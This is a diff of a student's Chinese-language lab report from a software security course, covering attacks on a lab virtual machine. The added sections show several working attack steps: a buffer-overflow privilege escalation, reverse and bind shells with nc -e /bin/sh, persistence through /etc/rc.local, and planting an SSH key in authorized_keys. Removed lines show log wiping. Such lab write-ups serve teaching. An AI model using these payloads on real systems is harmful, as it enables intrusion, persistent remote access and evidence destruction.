@@ -2,7 +2,7 @@
 
 ## 实验三 软件安全：**系统与网络安全：简单的网络攻击**
 
-姜俊彦 2022K8009970011 2023年11月28日
+姜俊彦 2022K8009970011 2023年12月1日
 
 ### 摘要：
 
@@ -125,6 +125,14 @@
    ![Lab3-11](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-11.png)
 
    可以看到`uid`已被置零，即获得了超级管理员权限。而对于进一步的操作，实验文档并没有给出指示，而笔者将尝试于**问题探究板块**讨论“提升权限后可以做的攻击操作”这一问题。
+
+   执行如下命令注入，可以挂起一个`uid=0`的`shell`到后台，以验证提权成功。
+
+   ```
+   (printf "AAAAAAAABBBBBBBBCCCCCCCC\xa9\x11\x40\0\0\0\0\0\n";sleep 1;echo 'nohup nc -l -k -p 2323 -e /bin/sh & sleep 1;')|/bin/hello
+   ```
+
+   ![Lab3-25](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-25.png)
 
 7. **攻击探测3：日志 II：**
 
@@ -316,20 +324,82 @@
 
    ![Lab3-24](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-24.png)
 
-   
+
+**三、综合应用**
+
+1. **反弹Shell：  **
+
+> 反弹 shell 命令注入执行命令有一些局限，例如执行交互式命令较为麻烦。请探索使用反弹 shell 的方法来获得交互式 shell。 
+>
+> 进一步地，你在有 root 权限时，可以把反弹 shell 的代码放在启动项里，以使得机器重启的时候能够自动向你发起反弹 shell 连接。
+>
+> 你能否在 ps 命令中看到自己的反弹 shell？试探索一些改进。
+
+在本机(`192.168.75.128`)进行`nc`监听
 
 ```
-/var/www/localhost/htdocs
-q;ifconfig
-q;fine / -name "hello"
-ifconfig
-
-q;(printf "AAAAAAAABBBBBBBBCCCCCCCC\xa9\x11\x40\0\0\0\0\0\n";sleep 1;ls /bin;)|/bin/hello;
-
-cat /dev/null > /var/log/apache2/error.log
-
-
-(printf "AAAAAAAABBBBBBBBCCCCCCCC\xa9\x11\x40\0\0\0\0\0\n";sleep 1;echo 'cat /dev/null > /var/log/apache2/error.log';)|/bin/hello
-成功的删除了error.log的内容
+nc -lvvp 1234
 ```
+
+然后执行以下命令注入即可获取一个到我本机`（192.68.75.128）`的挂载`shell`请求
+
+```
+q|(printf "AAAAAAAABBBBBBBBCCCCCCCC\xa9\x11\x40\0\0\0\0\0\n";sleep 1;echo 'nc 192.168.75.128 1234 -e /bin/sh';)|/bin/hello;
+```
+
+则得到的`shell`如图所示
+
+![Lab3-26](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-26.png)
+
+查阅可知`Ubuntu`的启动项文件为`/etc/rc.local`。
+
+在反弹的`Shell`中执行如下命令，并输入内容
+
+```bash
+cat
+
+#输入的内容
+#!/bin/sh
+
+nc 192.168.75.128 1234 -e /bin/sh
+
+exit 0
+```
+
+2. **放置自己的 ssh 公钥：**
+
+> 虚拟机还开放了 22 端口。因此，你可以通过在机器的密钥列表里放一个自己的公钥的方式来得到 root ssh 的权限。首先使用 ssh-keygen 生成密钥，然后将公钥那一条记录放在 ssh 的密钥文件里。
+
+操作如下：
+
+```bash
+ssh-keygen -b 4096 -C test1
+cat /home/jiuhao/.ssh/id_rsa.pub
+```
+
+查看得到的公钥如下：
+
+```
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC2JgrbojWag/wJGjZcuSTKLiTU7YMhXOiHKEjleyRbKEuGOBq06Jdyv02C8ft33Gbqyrq5KMj5wahpc0neY7N8RLS6qBezJb1C6SBZ1B7WGxFLNrr0Ye0PHEAfDsHDw+8gb/nxU3b3mQrVoeTNOBq+5xlFLQpDzBv00VPdGQcsfCrt/MoD2HDNuaOW5O+Y/OrKJy15kDTj3PxEOA3XfPH0gwfVmbMGl3xGFEAWt454RLpMZUjtxN1+70h7w0YWw14YjnUvcgcfv/KOVMjqZreL/2IO2iIyo+gQKr5aIkuepzYqPh0LFs5ATbdjzMpsyB7ns92sqZRkSVXfPSLOtPxoArX/PPwZ6sIkmuMSWdTT1KMzVak65wUjJw9Sz86okS75vP76+pAo3duQM7fRj98rRVzk+15XPSdAyS9xLVL6LmFw/w+UWTfNd5YQyGQho838EdZ0WYgaeqOsWdskl1OOEop4Gw2Mw3SPJZJXBXSarVojeZfBjbgYWXSrtnJxicqXyA2P5i+7+nU9ZQgr4aUe83FzzfMg+Mim/WFyrIjf1ZfuvncYf/7b0eRIHHmjblqOGWHa92Z5kzOzuzttnj1laj6BfEjU2txnhI2Od//32hcTvGoFeni1U8ymItT7KQ8KO51U6ce99zfx1YENMzMPODsbXge/O5TsUwZSRpiALw== test1
+```
+
+然后使用命令注入将其附加到目标机的`~/.ssh/authorized_keys`文件下
+
+```
+q|(printf "AAAAAAAABBBBBBBBCCCCCCCC\xa9\x11\x40\0\0\0\0\0\n";sleep 1;echo 'echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC2JgrbojWag/wJGjZcuSTKLiTU7YMhXOiHKEjleyRbKEuGOBq06Jdyv02C8ft33Gbqyrq5KMj5wahpc0neY7N8RLS6qBezJb1C6SBZ1B7WGxFLNrr0Ye0PHEAfDsHDw+8gb/nxU3b3mQrVoeTNOBq+5xlFLQpDzBv00VPdGQcsfCrt/MoD2HDNuaOW5O+Y/OrKJy15kDTj3PxEOA3XfPH0gwfVmbMGl3xGFEAWt454RLpMZUjtxN1+70h7w0YWw14YjnUvcgcfv/KOVMjqZreL/2IO2iIyo+gQKr5aIkuepzYqPh0LFs5ATbdjzMpsyB7ns92sqZRkSVXfPSLOtPxoArX/PPwZ6sIkmuMSWdTT1KMzVak65wUjJw9Sz86okS75vP76+pAo3duQM7fRj98rRVzk+15XPSdAyS9xLVL6LmFw/w+UWTfNd5YQyGQho838EdZ0WYgaeqOsWdskl1OOEop4Gw2Mw3SPJZJXBXSarVojeZfBjbgYWXSrtnJxicqXyA2P5i+7+nU9ZQgr4aUe83FzzfMg+Mim/WFyrIjf1ZfuvncYf/7b0eRIHHmjblqOGWHa92Z5kzOzuzttnj1laj6BfEjU2txnhI2Od//32hcTvGoFeni1U8ymItT7KQ8KO51U6ce99zfx1YENMzMPODsbXge/O5TsUwZSRpiALw== >> ~/.ssh/authorized_keys';)|/bin/hello;
+```
+
+下显示附加公钥成功的`authorized_keys`文件
+
+![Lab3-27](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-27.png)
+
+附加完毕后在本机使用下述指令进行登陆：
+
+```bash
+ssh -p 2222 root@127.0.0.1
+```
+
+运行结果如下：
+
+![Lab3-28](E:\VSCODE\UbuntuShare\ICS\UCAS-ICS-Share\Lab3\Pic\Lab3-28.png)
 
